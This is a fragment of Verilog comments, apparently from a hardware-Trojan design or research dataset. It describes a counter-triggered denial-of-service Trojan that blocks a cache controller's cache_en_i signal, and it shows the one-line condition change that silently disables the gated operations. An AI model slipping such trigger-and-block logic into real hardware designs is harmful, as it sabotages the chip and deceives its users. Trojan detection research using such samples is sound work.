 ...
 * 
 * Description:
 *   Disables operations by blocking cache_en_i control signal
 *   
 * Trigger: Counter on cache_en_i
 * Payload: Block cache_en_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block cache_en_i when trojan is active
//
// IMPORTANT: cache_en_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (cache_en_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: cache_en_i && 0 = 0 (always false)
//   All operations controlled by cache_en_i are blocked
